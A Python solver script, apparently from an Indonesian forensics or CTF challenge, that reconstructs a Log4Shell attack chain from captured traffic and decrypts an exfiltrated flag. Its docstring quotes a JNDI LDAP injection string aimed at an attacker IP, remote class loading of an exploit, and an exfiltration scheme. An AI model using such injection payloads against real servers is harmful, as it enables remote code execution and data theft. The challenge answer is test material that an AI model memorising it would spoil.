"""
re-sch-M4 - Insiden Peladen Inventaris
Rekonstruksi rantai Log4Shell (CVE-2021-44228) dari incident.pcap + app.log,
lalu pulihkan secret yang dieksfiltrasi via POST /collect.

Rantai serangan:
  1. GET /api/v2/inventory?id=42  User-Agent: ${jndi:ldap://203.0.113.66:1389/cn=Deserialize,dc=svc}
  2. LDAP referral (port 1389)   -> javaCodeBase=http://203.0.113.66:8888/a3f1c92b/
                                     javaClassName=Exploit javaFactory=ExploitFactory
  3. GET /a3f1c92b/Exploit.class (port 8888) -> respons berisi "resep" stage-2:
        A   = path codebase (hex)
        B   = gabungan 2 label pertama DNS beacon, sesuai urutan query
        key = SHA-256( fromhex(A+B) )[0:16]
        POST /collect body = base64( xor( zlib_deflate(secret), key ) )
  4. Dua query DNS: 5e7d.telemetry.metrics-sync.net, lalu 40b6.telemetry.metrics-sync.net
  5. POST /collect (port 80) membawa body terenkripsi -> secret di bawah ini.

(Stream ke 198.51.100.7 GET /assets/app.js adalah noise/decoy, tidak dipakai.)
"""
import base64
import hashlib
import zlib

A = "a3f1c92b"          
B = "5e7d" + "40b6"     

key = hashlib.sha256(bytes.fromhex(A + B)).digest()[:16]

body_b64 = (
    "vWKaHCBXJKC4imWSZUH5XzX3ndMRWqKQIr9L9Waql9yzzeb2MFdPQf+NoyYqZbN9"
    "K2l+PR+Z8k0lhmM8OgSO+wef3+SnF/acg3RYBrkALA=="
)
body = base64.b64decode(body_b64)
xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(body))
secret = zlib.decompress(xored)

print("key   :", key.hex())
print("FLAG  :", secret.decode())
